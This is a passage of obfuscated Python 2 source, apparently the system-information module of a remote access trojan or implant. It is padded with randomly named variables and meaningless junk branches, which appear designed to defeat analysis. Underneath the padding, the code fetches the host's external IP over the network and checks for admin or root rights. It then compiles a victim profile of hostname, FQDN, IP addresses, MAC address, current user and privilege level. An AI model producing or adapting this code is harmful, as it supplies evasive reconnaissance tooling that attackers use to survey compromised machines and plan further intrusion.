        ZnvHSCKlsJTteRpasrSymkgebtICZLfkWTyyWbgBWkbMinTleSXeDTuVNYOGorIc = 'DcoVvVPNEErDaMueWimfmYTtEXoMfdllLULlwmYWcKTNrYQGrkPUWpPNiehQtyop'
        if NMyvxWvzYWgPNHJpNiftOFtMEvZgZjsvLFICIheEVHnalSSxYxfqgMlhofKCvKPp == NeMtMXxZbwhOJxWyKZGXISKpIKcyMAhqSQkcbGapghUmTNKnCabOtJobUwcnErKc:
            for ZnvHSCKlsJTteRpasrSymkgebtICZLfkWTyyWbgBWkbMinTleSXeDTuVNYOGorIc in XhNZbETtqOisYloAhIlNIeUnSToeMEvHspziArDkrGrJAVNxPoeWWVDSoEGVXJmR:
                if ZnvHSCKlsJTteRpasrSymkgebtICZLfkWTyyWbgBWkbMinTleSXeDTuVNYOGorIc == NeMtMXxZbwhOJxWyKZGXISKpIKcyMAhqSQkcbGapghUmTNKnCabOtJobUwcnErKc:
                    XhNZbETtqOisYloAhIlNIeUnSToeMEvHspziArDkrGrJAVNxPoeWWVDSoEGVXJmR = jlxLCIDmXBbcCOscFNtwuTfwjzicMqjqgRLOctVEeRipqIgYXNzQFxLngCPgdVmB
                else:
                    NeMtMXxZbwhOJxWyKZGXISKpIKcyMAhqSQkcbGapghUmTNKnCabOtJobUwcnErKc = NoPNBrxmtysMNItPTQZTXkPfCECBwAdbNdZFUndKWyjRcmccKFnMvxcLYONXxClv
        try:
            XtCjALXWvNZhDPORCxqAkQONtkzHrLdrXctNxdNmMCCQDvLYuMyBJJnuzEbJfIwj = 'OGhAgCqEBNkDUQMdUxDuIjOajvPNoyAUFyWiOCVJuHweLsTfdAMwOfMlukvjTtmH'
            msXbcVimvmIHBcDIwOFfXmzScDyMULYZVArfXnmujrkkEhdnuLqGvpQigWmpsZOK = 'HPTgGmLKLZncuCYNMnjyrgKIMpWFExYrXFxqClHosOpTmuSpcIaMxjlwOjmCTqsX'
            KGbrualelqPSUjxRNtukVZrqMsitjYRHhSonuRlzlBkejMMLBprmzsRdWjfLzHLG = 'MsQfZaNnLMnASgTxADueRSSkEqxhFGPoxuInJkIpPzGiJLzcExAAqflHfJlaHjHM'
            PcCpcOoVsnvcHfHxQqWTlutNfsvhmhvuoSdfIxlTDcBcZhamdVunJELgIPszQAba = 'gfehkeXIbIXGDkkAOrasgPhwguqjLgNiHpBEbmOkjrTLBQuHiLpUjeEeIQuOzubR'
            VEIjsyirTMpvIQZhVWSoPonmZrTVKTIbsYOmyBFXfwSGlVNRwaMvDZjRACwcmcEy = 'llrAkfqBEVEEyXEJLRMHYKsCtbUEBUMvkfMMhSCvXZLwgrlWaIVctcbvhwuxaOFH'
            ssrQkjhYWKwYwwYFsxsZWNukIsLVQoSgRBKsNpQebfIKwuwpfodTJpXQmVMECLHI = 'yGrZfQRhVuYiCCRVvQSEHEBQrvAjSzRXsmSEYHdKWPtXRlEDYVJnyWnlAaiwCCuO'
            if KGbrualelqPSUjxRNtukVZrqMsitjYRHhSonuRlzlBkejMMLBprmzsRdWjfLzHLG == PcCpcOoVsnvcHfHxQqWTlutNfsvhmhvuoSdfIxlTDcBcZhamdVunJELgIPszQAba:
                for ssrQkjhYWKwYwwYFsxsZWNukIsLVQoSgRBKsNpQebfIKwuwpfodTJpXQmVMECLHI in VEIjsyirTMpvIQZhVWSoPonmZrTVKTIbsYOmyBFXfwSGlVNRwaMvDZjRACwcmcEy:
                    if ssrQkjhYWKwYwwYFsxsZWNukIsLVQoSgRBKsNpQebfIKwuwpfodTJpXQmVMECLHI == PcCpcOoVsnvcHfHxQqWTlutNfsvhmhvuoSdfIxlTDcBcZhamdVunJELgIPszQAba:
                        VEIjsyirTMpvIQZhVWSoPonmZrTVKTIbsYOmyBFXfwSGlVNRwaMvDZjRACwcmcEy = XtCjALXWvNZhDPORCxqAkQONtkzHrLdrXctNxdNmMCCQDvLYuMyBJJnuzEbJfIwj
                    else:
                        PcCpcOoVsnvcHfHxQqWTlutNfsvhmhvuoSdfIxlTDcBcZhamdVunJELgIPszQAba = msXbcVimvmIHBcDIwOFfXmzScDyMULYZVArfXnmujrkkEhdnuLqGvpQigWmpsZOK
            tBKdonglGAbHXFWbrxqcxkahYESDsuSGWrvqzDZDbLqSqvVGdWRUcnGewVhfHros = urllib.urlopen('http://'+WJdoQXqxSEsaPLIVoWyJpEdnEKGToGFMLANrRgBzbkUzwfTZXxERXXykcDmJEinQ).read().rstrip()
        except IOError:
            ZCAsIXwrUnvuqooZaDDHbJkvKFDFTJkeLMPSFxKyzfoDLPVMiGTfdmbRzZaHpdmd = 'tvSJpYsRqOEVAsdZiAflyyaEuNtzkqhnNguMymclSpieerfebYnkCquFffYlKBax'
            VoqikUkijVDSLozJEVtKtVNryyAUZURsjeXTBjqLIKauRfqLTMmNcjvLRrfsPnJP = 'gTcnvOQOLlcpkUoWTgpTxloLQMBOWmUckQvrCPLTilKaLUQzxnSGjwfCmHSoSrBI'
            qtnVJuxAAHDMtOQMeaFGhygnKuRwJhhcopwjRCXwycOEDghRIKPeiRjZHUtzmZis = 'AmXypliTZyyQLDZmrwYfFeAbuooFBhULzRaHevDHBjuHVeJdOHilqDgeFWusLJbw'
            if ZCAsIXwrUnvuqooZaDDHbJkvKFDFTJkeLMPSFxKyzfoDLPVMiGTfdmbRzZaHpdmd == VoqikUkijVDSLozJEVtKtVNryyAUZURsjeXTBjqLIKauRfqLTMmNcjvLRrfsPnJP:
                TOYwrGsFOLHfcykvnNZUzQvEiZDCrpoQphCddQsYvpPzXVMARPNnmifCRMAIptMy = 'CmqpXasSTnNGrqhAHCbxgqQHJFwjyUvtVtDHqLJATJJbFLXjHTwyyhxtCMzVQrWx'
                TOYwrGsFOLHfcykvnNZUzQvEiZDCrpoQphCddQsYvpPzXVMARPNnmifCRMAIptMy = ZCAsIXwrUnvuqooZaDDHbJkvKFDFTJkeLMPSFxKyzfoDLPVMiGTfdmbRzZaHpdmd
            else:
                TOYwrGsFOLHfcykvnNZUzQvEiZDCrpoQphCddQsYvpPzXVMARPNnmifCRMAIptMy = 'CmqpXasSTnNGrqhAHCbxgqQHJFwjyUvtVtDHqLJATJJbFLXjHTwyyhxtCMzVQrWx'
                TOYwrGsFOLHfcykvnNZUzQvEiZDCrpoQphCddQsYvpPzXVMARPNnmifCRMAIptMy = qtnVJuxAAHDMtOQMeaFGhygnKuRwJhhcopwjRCXwycOEDghRIKPeiRjZHUtzmZis
            pass
            BVlVqnWmVNdmaYCqssCbHXhqcbLRMMqjbUdZEryXoCfTMkUiFOiNzKYgLZsdQNPH = 'gddUeZSOaXeKHvGZJWwnDItNaTxdEeffxnWCpzHAyLHBhTDNCFLZjOwahtyocckN'
            gkCjFqliOtuKDzLLlVZckLslbIIPFlwGoiwSbGLgUGeNPusJNRDVZWlTubOIYVuz = 'UnYxpgOjgSPNxgtFCFzvJBaHnFBpojWNdWPWzOcZuiMwbQHsPhrLNREOoPcwtyCw'
            DnScjlqpQmUWWUfAZnnTeRxmdxOoAOZrTYbkyejHMtywFQnscazsqLUOOXuXdYFq = 'RVsGhdfpCxfwegRARanhwkQfuKDBPZPCOLlBFpsHiTxxRCFKslnYylHcnpVdqvZj'
            eTXqocKuwtMlDAWsbvJcUdfjvHBHeqPhQTkobBavAqvJETmmRoYdXWhDwOLWBJOt = 'uAUDvlSbNfngkkenyxtoIEnaLunmQRGDIQstHYqkUxUVNOXCKIrHFdapLgMyVrpA'
            BxSCnPSoeCCeamIlrpRFmJXmIecfqrhfbYEuWlaNesGeRSkNuIawtapfCDXOhRvX = 'LTOBmPUKySiFSfndSbyfMGBRBphirurddUpaFffSdvlTEcHcbMsgJbekhEELFbny'
            if BVlVqnWmVNdmaYCqssCbHXhqcbLRMMqjbUdZEryXoCfTMkUiFOiNzKYgLZsdQNPH in gkCjFqliOtuKDzLLlVZckLslbIIPFlwGoiwSbGLgUGeNPusJNRDVZWlTubOIYVuz:
                BVlVqnWmVNdmaYCqssCbHXhqcbLRMMqjbUdZEryXoCfTMkUiFOiNzKYgLZsdQNPH = BxSCnPSoeCCeamIlrpRFmJXmIecfqrhfbYEuWlaNesGeRSkNuIawtapfCDXOhRvX
                if gkCjFqliOtuKDzLLlVZckLslbIIPFlwGoiwSbGLgUGeNPusJNRDVZWlTubOIYVuz in DnScjlqpQmUWWUfAZnnTeRxmdxOoAOZrTYbkyejHMtywFQnscazsqLUOOXuXdYFq:
                    gkCjFqliOtuKDzLLlVZckLslbIIPFlwGoiwSbGLgUGeNPusJNRDVZWlTubOIYVuz = eTXqocKuwtMlDAWsbvJcUdfjvHBHeqPhQTkobBavAqvJETmmRoYdXWhDwOLWBJOt
            elif gkCjFqliOtuKDzLLlVZckLslbIIPFlwGoiwSbGLgUGeNPusJNRDVZWlTubOIYVuz in BVlVqnWmVNdmaYCqssCbHXhqcbLRMMqjbUdZEryXoCfTMkUiFOiNzKYgLZsdQNPH:
                DnScjlqpQmUWWUfAZnnTeRxmdxOoAOZrTYbkyejHMtywFQnscazsqLUOOXuXdYFq = gkCjFqliOtuKDzLLlVZckLslbIIPFlwGoiwSbGLgUGeNPusJNRDVZWlTubOIYVuz
                if DnScjlqpQmUWWUfAZnnTeRxmdxOoAOZrTYbkyejHMtywFQnscazsqLUOOXuXdYFq in gkCjFqliOtuKDzLLlVZckLslbIIPFlwGoiwSbGLgUGeNPusJNRDVZWlTubOIYVuz:
                    gkCjFqliOtuKDzLLlVZckLslbIIPFlwGoiwSbGLgUGeNPusJNRDVZWlTubOIYVuz = BxSCnPSoeCCeamIlrpRFmJXmIecfqrhfbYEuWlaNesGeRSkNuIawtapfCDXOhRvX
        if tBKdonglGAbHXFWbrxqcxkahYESDsuSGWrvqzDZDbLqSqvVGdWRUcnGewVhfHros and (6 < len(tBKdonglGAbHXFWbrxqcxkahYESDsuSGWrvqzDZDbLqSqvVGdWRUcnGewVhfHros) < 16):
            ioUUmfrHZQioFrYFBFAyCrwMAFGFaVoauupTRnEgylbPvqGphgfAUGQChcZLhtka = 'iTuHNcozDNtWbcdbGyVhNZeUFbQuGhjFlipEsZAvvGYgIXNXcNvPYWOdoCThsqVM'
            EpqtTwfIMECRqPjldsuzguYljZTjljiKUmUlwnMJZRyFoXNtFZbCKYmZAWvOyYdX = 'nFbLjvrqTcCiOyAivIzJihlrvYxbTlcACDzTemyDVRIGNEvenpFNERgTlCIPfcPg'
            AzaEqWEedwEUueByLmkjoOXtkxxTMDGYRzXEGfRgbZvOpqiIiYovkumSRyjdbubG = 'hbUfUrJaLoLUKeHlMUYusvnNEixbBDSPcTFuYMDfmzFgfMNhTXFEXaZbZsijpWny'
            EPEFsnqigmKMyTIHutUXQDHBHTnuKEwTnROPAsWMmIdxrayfYZoaIYATlUnNRKjQ = 'sxxKwTvaogfhnBHGjLfdysNpgwjiidLGIpkYKIfJsARMYlNJWinZKENLgMUCFjzF'
            WPSKcktebbwoBqQswLtYYqTRyzfwDUXTSqTXtiEeoasyFlufcFcIlxngipBAiMlY = 'GkXGpCdYYkpVEpXpSFpuHIjZuxJNTZOeMntFJslWsVaezYInVEGJQevbVvpZTGSw'
            tVbLmnsDKayyodpeZIJZMZjRRKHulhQPDFaMBEgyivxTeFylAMnvqzAfZEfULpvd = 'jSQCOFzvrfRyOXUIDmdCuvgwsUKxlynfWgmGEUPDNfYoroqhXSeEsAaQFgMdDnWu'
            if ioUUmfrHZQioFrYFBFAyCrwMAFGFaVoauupTRnEgylbPvqGphgfAUGQChcZLhtka != EPEFsnqigmKMyTIHutUXQDHBHTnuKEwTnROPAsWMmIdxrayfYZoaIYATlUnNRKjQ:
                EpqtTwfIMECRqPjldsuzguYljZTjljiKUmUlwnMJZRyFoXNtFZbCKYmZAWvOyYdX = AzaEqWEedwEUueByLmkjoOXtkxxTMDGYRzXEGfRgbZvOpqiIiYovkumSRyjdbubG
                for tVbLmnsDKayyodpeZIJZMZjRRKHulhQPDFaMBEgyivxTeFylAMnvqzAfZEfULpvd in EPEFsnqigmKMyTIHutUXQDHBHTnuKEwTnROPAsWMmIdxrayfYZoaIYATlUnNRKjQ:
                    if tVbLmnsDKayyodpeZIJZMZjRRKHulhQPDFaMBEgyivxTeFylAMnvqzAfZEfULpvd != AzaEqWEedwEUueByLmkjoOXtkxxTMDGYRzXEGfRgbZvOpqiIiYovkumSRyjdbubG:
                        EpqtTwfIMECRqPjldsuzguYljZTjljiKUmUlwnMJZRyFoXNtFZbCKYmZAWvOyYdX = EpqtTwfIMECRqPjldsuzguYljZTjljiKUmUlwnMJZRyFoXNtFZbCKYmZAWvOyYdX
                    else:
                        WPSKcktebbwoBqQswLtYYqTRyzfwDUXTSqTXtiEeoasyFlufcFcIlxngipBAiMlY = ioUUmfrHZQioFrYFBFAyCrwMAFGFaVoauupTRnEgylbPvqGphgfAUGQChcZLhtka
            else:
                AzaEqWEedwEUueByLmkjoOXtkxxTMDGYRzXEGfRgbZvOpqiIiYovkumSRyjdbubG = ioUUmfrHZQioFrYFBFAyCrwMAFGFaVoauupTRnEgylbPvqGphgfAUGQChcZLhtka
                ioUUmfrHZQioFrYFBFAyCrwMAFGFaVoauupTRnEgylbPvqGphgfAUGQChcZLhtka = WPSKcktebbwoBqQswLtYYqTRyzfwDUXTSqTXtiEeoasyFlufcFcIlxngipBAiMlY
                if AzaEqWEedwEUueByLmkjoOXtkxxTMDGYRzXEGfRgbZvOpqiIiYovkumSRyjdbubG == ioUUmfrHZQioFrYFBFAyCrwMAFGFaVoauupTRnEgylbPvqGphgfAUGQChcZLhtka:
                    for tVbLmnsDKayyodpeZIJZMZjRRKHulhQPDFaMBEgyivxTeFylAMnvqzAfZEfULpvd in ioUUmfrHZQioFrYFBFAyCrwMAFGFaVoauupTRnEgylbPvqGphgfAUGQChcZLhtka:
                        if tVbLmnsDKayyodpeZIJZMZjRRKHulhQPDFaMBEgyivxTeFylAMnvqzAfZEfULpvd == AzaEqWEedwEUueByLmkjoOXtkxxTMDGYRzXEGfRgbZvOpqiIiYovkumSRyjdbubG:
                            AzaEqWEedwEUueByLmkjoOXtkxxTMDGYRzXEGfRgbZvOpqiIiYovkumSRyjdbubG = ioUUmfrHZQioFrYFBFAyCrwMAFGFaVoauupTRnEgylbPvqGphgfAUGQChcZLhtka
                        else:
                            AzaEqWEedwEUueByLmkjoOXtkxxTMDGYRzXEGfRgbZvOpqiIiYovkumSRyjdbubG = WPSKcktebbwoBqQswLtYYqTRyzfwDUXTSqTXtiEeoasyFlufcFcIlxngipBAiMlY
            break
            XyiDzHgCBGpORzjYLdsKQQmYtGlsDqaylwcpQDfDiBNQftZUIUSPJMDmQCIGmLBU = 'mGomqimLmuSsyYpvaTtEpHvZQoEjPGwEkmMrlJUdYanNUIRHrZNZSNKvfRlftvWw'
            jTkPRUEPjsFmLSvSiGyIjsEzBlBjKtyiYbpxPlrACVvIiuggxnKFcQVYpcfimCoO = 'qxzjQOkuIYDSJBVWMdOMvPcOxIDKpzusjyvsWrUPFTYIITQpDVfqUbpCjXzhSxst'
            KTkhPgDLSiDVeBBBhRcQwAkukLhPQXkvXNMMaykihdfbVkMZYvgwGRqpNsjAZrDC = 'lQTzStWlOvtLDysmPkToeVVZwXyRcfyJQvdIuqobOvFJjTbOyRcFViHvuYsIYupH'
            gjwtwmVhcywoMbnEzMqvZfmfNbrtsweNpmkimQkuVilGRsCJRDOMgtCHjoOZZJGs = 'JQIujexppMdWcOCYTgDHAHAIrtozSVkRCBrOKUzxZtsmxKdAnCznZEBIFfjybeDY'
            KJsSnZKNQDcwEYZvpeFCdCgXgWhtsPAlrtvhVIkNPYZWcWRVVnQkcnMWgdwCxIZE = 'IXBQxezcRWCrPPcAhcWtxSIZEkwUusKMKbVJKCHhOnAbaywEqyuObdmGdniDJcfV'
            if XyiDzHgCBGpORzjYLdsKQQmYtGlsDqaylwcpQDfDiBNQftZUIUSPJMDmQCIGmLBU in jTkPRUEPjsFmLSvSiGyIjsEzBlBjKtyiYbpxPlrACVvIiuggxnKFcQVYpcfimCoO:
                XyiDzHgCBGpORzjYLdsKQQmYtGlsDqaylwcpQDfDiBNQftZUIUSPJMDmQCIGmLBU = KJsSnZKNQDcwEYZvpeFCdCgXgWhtsPAlrtvhVIkNPYZWcWRVVnQkcnMWgdwCxIZE
                if jTkPRUEPjsFmLSvSiGyIjsEzBlBjKtyiYbpxPlrACVvIiuggxnKFcQVYpcfimCoO in KTkhPgDLSiDVeBBBhRcQwAkukLhPQXkvXNMMaykihdfbVkMZYvgwGRqpNsjAZrDC:
                    jTkPRUEPjsFmLSvSiGyIjsEzBlBjKtyiYbpxPlrACVvIiuggxnKFcQVYpcfimCoO = gjwtwmVhcywoMbnEzMqvZfmfNbrtsweNpmkimQkuVilGRsCJRDOMgtCHjoOZZJGs
            elif jTkPRUEPjsFmLSvSiGyIjsEzBlBjKtyiYbpxPlrACVvIiuggxnKFcQVYpcfimCoO in XyiDzHgCBGpORzjYLdsKQQmYtGlsDqaylwcpQDfDiBNQftZUIUSPJMDmQCIGmLBU:
                KTkhPgDLSiDVeBBBhRcQwAkukLhPQXkvXNMMaykihdfbVkMZYvgwGRqpNsjAZrDC = jTkPRUEPjsFmLSvSiGyIjsEzBlBjKtyiYbpxPlrACVvIiuggxnKFcQVYpcfimCoO
                if KTkhPgDLSiDVeBBBhRcQwAkukLhPQXkvXNMMaykihdfbVkMZYvgwGRqpNsjAZrDC in jTkPRUEPjsFmLSvSiGyIjsEzBlBjKtyiYbpxPlrACVvIiuggxnKFcQVYpcfimCoO:
                    jTkPRUEPjsFmLSvSiGyIjsEzBlBjKtyiYbpxPlrACVvIiuggxnKFcQVYpcfimCoO = KJsSnZKNQDcwEYZvpeFCdCgXgWhtsPAlrtvhVIkNPYZWcWRVVnQkcnMWgdwCxIZE
    WCaxIJmJyHMqmMnblNFQNDTdjtsCLNWvtAOlJkpejwKDTYhLGsiezPpxnbxZYuaE = False
    vSIKzrMrBITuiYthhVXTktodpMJiUiPdUztlAGIuiiiJRhwmiryujyDJqYTkhzay = 'MTsuWWKiGeLUPFtIzGGPfSdkocdsmteNfJhBqrOYgBpbqDEoyueuDCcPYcZMPJOk'
    yostTwQYUXeJNILjqqrOBggQvKuEZIkQSSVbWLuyqFPSurADzHBRaSktBFZiWmpD = 'JajFblpSjiIXXkvgtvNjrnUnZhhLqjqPNSqbyxoQPinCemeMuaAyzKNaipDRLyZG'
    WoDpecaqNqqVUTjBgEBqeGkpiZIZWhLyUFtwrSrtgttExGnFtZRuxIsbPFwsFgYg = 'sJQibtfoXJUcuWEcdCzBWJtVfOQOZJYdpnlFXZqRkhakCAoQWzyXGOLhGflBhqun'
    dnjRgdLOfFSrAZuvLOiaIkmwgFudJWEaMaSKoqwAvVeOfksgCujzazvaLctbVGjs = 'CfCcFDxHOvxXTnVMyJPFVvbcogOuexasEPANjMsMcgjvtixQmhcywVWhrurnmrfn'
    IAToITnfgbwbumHCbvQWijuIsNFnubYpiXSmxDwRvzwJCLzRZhSrLWpvrdXsoRPo = 'QkxcTRtzFDJpDCylAJKyrmyWhNeTdppDthPhVlQusNWDoqzjOztxYAVQTkoYHrRJ'
    if vSIKzrMrBITuiYthhVXTktodpMJiUiPdUztlAGIuiiiJRhwmiryujyDJqYTkhzay in yostTwQYUXeJNILjqqrOBggQvKuEZIkQSSVbWLuyqFPSurADzHBRaSktBFZiWmpD:
        vSIKzrMrBITuiYthhVXTktodpMJiUiPdUztlAGIuiiiJRhwmiryujyDJqYTkhzay = IAToITnfgbwbumHCbvQWijuIsNFnubYpiXSmxDwRvzwJCLzRZhSrLWpvrdXsoRPo
        if yostTwQYUXeJNILjqqrOBggQvKuEZIkQSSVbWLuyqFPSurADzHBRaSktBFZiWmpD in WoDpecaqNqqVUTjBgEBqeGkpiZIZWhLyUFtwrSrtgttExGnFtZRuxIsbPFwsFgYg:
            yostTwQYUXeJNILjqqrOBggQvKuEZIkQSSVbWLuyqFPSurADzHBRaSktBFZiWmpD = dnjRgdLOfFSrAZuvLOiaIkmwgFudJWEaMaSKoqwAvVeOfksgCujzazvaLctbVGjs
    elif yostTwQYUXeJNILjqqrOBggQvKuEZIkQSSVbWLuyqFPSurADzHBRaSktBFZiWmpD in vSIKzrMrBITuiYthhVXTktodpMJiUiPdUztlAGIuiiiJRhwmiryujyDJqYTkhzay:
        WoDpecaqNqqVUTjBgEBqeGkpiZIZWhLyUFtwrSrtgttExGnFtZRuxIsbPFwsFgYg = yostTwQYUXeJNILjqqrOBggQvKuEZIkQSSVbWLuyqFPSurADzHBRaSktBFZiWmpD
        if WoDpecaqNqqVUTjBgEBqeGkpiZIZWhLyUFtwrSrtgttExGnFtZRuxIsbPFwsFgYg in yostTwQYUXeJNILjqqrOBggQvKuEZIkQSSVbWLuyqFPSurADzHBRaSktBFZiWmpD:
            yostTwQYUXeJNILjqqrOBggQvKuEZIkQSSVbWLuyqFPSurADzHBRaSktBFZiWmpD = IAToITnfgbwbumHCbvQWijuIsNFnubYpiXSmxDwRvzwJCLzRZhSrLWpvrdXsoRPo
    if plat_type.startswith('win'):
        DZrnLRuhRDHfuAhxkhvXbbMgpyfvunePXzMqZhTnCSgiYuodgmGzHbvbdhiaDuTR = 'lgtMzZVodHrOshOAceLYkaDHSrFgubNSAosBhEbDsBhqFqbmXrHBRouctcrkcrjd'
        UKFIKdlJDHccYRFtqiotbMeXqLOHSWlXxufdYnZIbUIxoUNywhkkKokdwsnOMNTs = 'GmxGsnDcqiZHWgxjfZcuDHmeqgdLIkiMBahUtNKcEsaBIEpfzlGkCgTrlPuuxUOd'
        if DZrnLRuhRDHfuAhxkhvXbbMgpyfvunePXzMqZhTnCSgiYuodgmGzHbvbdhiaDuTR != UKFIKdlJDHccYRFtqiotbMeXqLOHSWlXxufdYnZIbUIxoUNywhkkKokdwsnOMNTs:
            cZgRQvwEHuXvHwrexFDJropzntXMzqteLybpCjpdNFszURFbmgdODhiXhkZZfjgw = 'XfntiTVJsnUhpUMRlsLxHJNRWVClSiNNuUthbVgKQvNsbBHAkpRMhqyaxfxlfpdz'
            CwIdkSSlDXjRaSRujfQUdsMncWZJKgDJyyCrspjaeLPyHuGbVifCRddfHiNjPBWx = 'fZcldzyniLbHjaVKLFDnPKOQKZlwXSASyBWtZoqdoYHBGjRDDHcItyeJxcRsVjeg'
            CwIdkSSlDXjRaSRujfQUdsMncWZJKgDJyyCrspjaeLPyHuGbVifCRddfHiNjPBWx = cZgRQvwEHuXvHwrexFDJropzntXMzqteLybpCjpdNFszURFbmgdODhiXhkZZfjgw
        WCaxIJmJyHMqmMnblNFQNDTdjtsCLNWvtAOlJkpejwKDTYhLGsiezPpxnbxZYuaE = ctypes.windll.shell32.IsUserAnAdmin() != 0
    elif plat_type.startswith('linux') or platform.startswith('darwin'):
        GIqLBeoGnmYreHRQYqPwdkmfFaXYozwDYRDaaTuvYyEMrNhjlqpgZvyisNbIDHcj = 'ExJtBlrzXDbcrItSrfDHfOxffaeqnNJICFwHJtIveetvUCRSgHfYESXOQpqQUpdr'
        WazTvJIvUwCpiIhrKDxbMFzwoLWacXMWhJMLxwVspWaadENkcrAILHEaEypqaZGP = 'qLUZvbZqcCoKySPBDrfESQiLSTHfzEJiTFZEfITGxyxWvgVHbrzCPMbHAvgFceIs'
        BJGPcBfFuZAEPqHWvTKehjFyCmrAntlnXAtMhGufqXfMonuJrMXcBBbDFEKPClAn = 'ekAYtXPeZwhhFtZPvBuwAAMthmpRRiuVgMSjnZhyTAGCPrxbdDTVbDzQZEXNuPbM'
        if GIqLBeoGnmYreHRQYqPwdkmfFaXYozwDYRDaaTuvYyEMrNhjlqpgZvyisNbIDHcj == WazTvJIvUwCpiIhrKDxbMFzwoLWacXMWhJMLxwVspWaadENkcrAILHEaEypqaZGP:
            QGwtQYGUCHTjEIZOpbwNFOsksGVrXIrqMwHuKKxXmAiBDnMOXsZxiEMlszbEeEvT = 'fKfjJpYnvIhghfQrgqaWugMyETeYthftSRjnlKFxdLepnzBhrBGppPYtIgFnaZVA'
            QGwtQYGUCHTjEIZOpbwNFOsksGVrXIrqMwHuKKxXmAiBDnMOXsZxiEMlszbEeEvT = GIqLBeoGnmYreHRQYqPwdkmfFaXYozwDYRDaaTuvYyEMrNhjlqpgZvyisNbIDHcj
        else:
            QGwtQYGUCHTjEIZOpbwNFOsksGVrXIrqMwHuKKxXmAiBDnMOXsZxiEMlszbEeEvT = 'fKfjJpYnvIhghfQrgqaWugMyETeYthftSRjnlKFxdLepnzBhrBGppPYtIgFnaZVA'
            QGwtQYGUCHTjEIZOpbwNFOsksGVrXIrqMwHuKKxXmAiBDnMOXsZxiEMlszbEeEvT = BJGPcBfFuZAEPqHWvTKehjFyCmrAntlnXAtMhGufqXfMonuJrMXcBBbDFEKPClAn
        WCaxIJmJyHMqmMnblNFQNDTdjtsCLNWvtAOlJkpejwKDTYhLGsiezPpxnbxZYuaE = os.getuid() == 0
    tsiUuCrTheEdyqcAssKCUYnLLOWJJbzGosmtWqyZopmjzXMGxdIUkHRpJDRShQhF = 'Yes' if WCaxIJmJyHMqmMnblNFQNDTdjtsCLNWvtAOlJkpejwKDTYhLGsiezPpxnbxZYuaE else 'No'
    NoIFfIQiWfgJXXvoycjyseHiTqINJomyqWJjGOoPQYvSSKNXUVWnOZDEofKbYEdx = '''
    System Platform     - {}
    Processor           - {}
    Architecture        - {}
    Hostname            - {}
    FQDN                - {}
    Internal IP         - {}
    External IP         - {}
    MAC Address         - {}
    Current User        - {}
    Admin Access        - {}
    '''.format(EWmtWlkJuLgkUOjxEJxQMXtqfFncvpresgyHIVopFDsFtoWHRBeMRyhQODNyZgJx, processor, architecture,
    yACdQyDMoosZjJvgEFQQTHOifCqXXGBvGsKPzqBHyfgENOvFsmcWVIjTAizZnXHu, nnkKjbvrMoaYqGZoOfFvAZCXmChgIqUpQcTCiyeBecIgwncTOmJZxesxqfkRbhqO, RAyqNtzgupuaVxvixrlAZPbjGWbogkQmKERIPQPQvgdHKnfPvtGTrqPTVdCDKprN, tBKdonglGAbHXFWbrxqcxkahYESDsuSGWrvqzDZDbLqSqvVGdWRUcnGewVhfHros, GDHIYkOsmvTwojcNGWOCApAzWuSZjAHOpPHdYyKDuWDnoxqbhNzniAtFvFNEOzue, aCCAQHXQAvQZWaKOxvkRXHIrsUPZsNLpuSrFaMNviuPDGVwBMwnqlzYturgbLdMB, tsiUuCrTheEdyqcAssKCUYnLLOWJJbzGosmtWqyZopmjzXMGxdIUkHRpJDRShQhF)
    return NoIFfIQiWfgJXXvoycjyseHiTqINJomyqWJjGOoPQYvSSKNXUVWnOZDEofKbYEdx
